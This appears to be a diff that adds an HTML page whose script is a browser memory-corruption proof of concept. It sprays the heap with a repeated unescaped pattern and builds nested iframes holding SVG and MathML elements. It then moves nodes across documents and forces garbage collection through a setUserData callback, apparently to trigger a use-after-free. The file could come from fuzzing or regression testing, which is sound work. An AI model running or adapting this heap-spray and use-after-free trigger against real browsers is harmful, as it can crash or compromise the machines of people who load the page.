@@ -1,0 +1,98 @@
+<script>
+
+var ar = new Array(100000);
+
+function fill() {
+        var s = unescape("%ubeef%udead%udead%udead%u0000%u0000%u3030%u3030");
+        while(s.length < 0x40000) {
+                for(var x=0; x<100; x++) ar.push(s+s);
+                s+=s;
+        }
+}
+
+
+function gc() {
+                var evt = document.createEvent("Events");
+                evt.initEvent("please-gc", true, false);
+                document.dispatchEvent(evt);
+		fill();
+}
+
+
+gc();
+function start(){
+tmp = document.createElement('iframe');
+tmp.src="data:image/svg+xml,"+escape("<?xml version='1.0' standalone='no'?><!DOCTYPE svg><svg xmlns='http://www.w3.org/2000/svg'><defs id='element1'></defs><g id='element5'></g></svg>");
+tmp.id = 'ifr23282';
+try{document.getElementById('store_div').appendChild(tmp);}catch(e){}
+window.setTimeout('startrly()', 100);
+} function startrly() {
+try{o6=document.createComment(null);}catch(e){}
+try{o9=document.getElementById('ifr23282').contentDocument.documentElement;;}catch(e){}
+try{o13=document.getElementById('ifr23282').contentDocument.getElementById('element1');;}catch(e){}
+try{o15=document.getElementById('ifr23282').contentDocument.getElementById('element5');;}catch(e){}
+try{tmp = document.createElement('iframe');}catch(e){}
+try{tmp.id = 'ifr6690';}catch(e){}
+try{o6.ownerDocument.documentElement.appendChild(tmp);}catch(e){}
+window.setTimeout('start_dataiframe0()',100);
+} function start_dataiframe0(){
+try{o19=o6.ownerDocument.getElementById('ifr6690').contentDocument.documentElement;;}catch(e){}
+try{o24=document.createElementNS('http://www.w3.org/1998/Math/MathML','annotation-xml');;}catch(e){}
+try{o35=document.createElementNS('http://www.w3.org/1998/Math/MathML','emptyset');;}catch(e){}
+try{o40=o19.cloneNode(false);;}catch(e){}
+try{o19.appendChild(o13);}catch(e){}
+try{o19.appendChild(o15);}catch(e){}
+try{o24.appendChild(o40);}catch(e){}
+try{tmp = document.createElement('iframe');}catch(e){}
+tmp.src="data:text/html,<article%20id='element1'></article><command%20id='element3'></command>";
+try{tmp.id = 'ifr17516';}catch(e){}
+try{o13.ownerDocument.documentElement.appendChild(tmp);}catch(e){}
+window.setTimeout('start_dataiframe4()',100);
+} function start_dataiframe4(){
+try{o62=o13.ownerDocument.getElementById('ifr17516').contentDocument.getElementById('element1');;}catch(e){}
+try{tmp.id = 'ifr2522';}catch(e){}
+try{o101=o15.ownerDocument.getElementById('ifr2522').contentDocument.getElementById('element3');;}catch(e){}
+try{o101.appendChild(o24);}catch(e){}
+try{o109=o35.setUserData('key',null,function (o,k,d,s,ds) { gc(); });;}catch(e){}
+try{o112=document.createElementNS('http://www.w3.org/1999/xhtml', 'script');;}catch(e){}
+try{o124=document.createElementNS('http://www.w3.org/1998/Math/MathML','root');;}catch(e){}
+try{o125=document.createElementNS('http://www.w3.org/2000/svg','font-face');;}catch(e){}
+gc()
+try{o150=o40;}catch(e){}
+try{tmp.id = 'ifr44501';}catch(e){}
+try{o124.ownerDocument.documentElement.appendChild(tmp);}catch(e){}
+window.setTimeout('start_dataiframe7()',100);
+} function start_dataiframe7(){
+try{o152=o124.ownerDocument.getElementById('ifr44501').contentDocument.documentElement;;}catch(e){}
+try{tmp = document.createElement('iframe');}catch(e){}
+try{tmp.src="data:text/html,<div%20id='element1'></div>";}catch(e){}
+try{tmp.id = 'ifr55543';}catch(e){}
+try{o125.ownerDocument.documentElement.appendChild(tmp);}catch(e){}
+window.setTimeout('start_dataiframe10()',100);
+} function start_dataiframe10(){
+try{o198=o125.ownerDocument.getElementById('ifr55543').contentDocument.getElementById('element1');;}catch(e){}
+try{o152.appendChild(o101);}catch(e){}
+try{o152.ownerDocument.documentElement.appendChild(tmp);}catch(e){}
+window.setTimeout('start_dataiframe17()',100);
+} function start_dataiframe17(){
+try{o286=o152.ownerDocument.getElementById('ifr55543').contentDocument.documentElement;;}catch(e){}
+try{o288=o152.ownerDocument.getElementById('ifr55543').contentDocument.getElementById('element1');;}catch(e){}
+try{o349=document.createElementNS('http://www.w3.org/2000/svg','animate');;}catch(e){}
+try{o150.appendChild(o349);}catch(e){}
+try{o288.appendChild(o150);}catch(e){}
+try{o198.appendChild(o349);}catch(e){}
+window.setTimeout('start_dataiframe24()',100);
+} function start_dataiframe24(){ 
+try{o286.appendChild(o9);}catch(e){}
+try{o62.appendChild(o152);}catch(e){}
+try{o112.appendChild(o286);}catch(e){}
+try{o534=o35.cloneNode(false);;}catch(e){}
+gc();
+o35 = null;
+gc();
+window.setTimeout("fill()",300);
+}
+</script>
+<body onload="start()">
+<div id="store_div"></div>
+</body>
